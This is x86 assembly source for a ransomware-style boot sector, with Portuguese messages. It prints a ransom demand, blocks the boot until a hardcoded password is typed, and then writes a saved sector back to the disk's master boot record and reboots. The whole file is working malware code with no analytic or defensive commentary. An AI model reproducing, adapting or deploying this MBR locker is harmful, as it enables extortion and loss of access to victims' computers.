mov ax, 0x02
int 0x10

xor ax, ax
xor bx, bx
xor cx, cx
xor dx, dx

mov es, ax
mov ds, ax

mov ax, 0x1301
xor bx, bx
mov bl, 0x0f
mov cl, [tamanhoMensagem + 0x7c00]
xor dx, dx
mov bp, mensagem + 0x7c00
int 0x10

xor si, si

volta:

cmp si, [tamanhoSenha + 0x7c00]
je acertou

;verificar status do teclado

mov ah, 0x01
int 0x16

; se zf=1, fica no loop

jz volta

;ler buffer do teclado

xor ax, ax
int 0x16

;lendo

;mostrar na tela o q foi pressionado

mov ah, 0x0e
xor bx, bx
int 0x10

cmp al, [senha + 0x7c00 + si]
jne errou
inc si
jmp volta

acertou:
mov ax, 0x1301
xor bx, bx
mov bl, 0x0f
mov cl, byte [tamanhoMensagemAcerto + 0x7c00]
xor dx, dx
mov dh, 0x04
mov bp, mensagemAcerto + 0x7c00
int 0x10
jmp lerSetoresMemoria
errou:
mov ax, 0x1301
xor bx, bx
mov bl, 0x0F
mov cl, [tamanhoMensagemErro + 0x7c00]
xor dx, dx
mov dh, 0x04
mov bp, mensagemErro + 0x7c00
int 0x10
jmp fim

fim:
jmp $

lerSetoresMemoria:

mov ah, 0x02
mov al, 0x02
mov ch, 0x00
mov cl, 0x02
mov dh, 0x00
mov dl, 0x80
mov bx, stage2 + 0x7c00
int 0x13

jmp stage2

mensagem: db 'Somente tera seu computador de volta depois que me pagar!', 0x0a, 0x0d, 'Se ja pagou, digite a senha aqui: ', 0x00
tamanhoMensagem: db ($ - mensagem)
mensagemErro: db 'Senha errada!', 0x00
tamanhoMensagemErro: db ($ - mensagemErro)
mensagemAcerto: db 'Senha correta!', 0x00
tamanhoMensagemAcerto: db ($ - mensagemAcerto)
senha: db 'perlutech'
tamanhoSenha: dw ($ - senha)
times 510-($-$$) db 0x00
dw 0xAA55

stage2:

mov ah, 0x03
mov al, 0x01
mov ch, 0x00
mov cl, 0x01
mov dh, 0x00
mov dl, 0x80
mov bx, 0x8000
int 0x13

jmp 0xffff:0000

times 1024 - ($ - $$) db 0x00
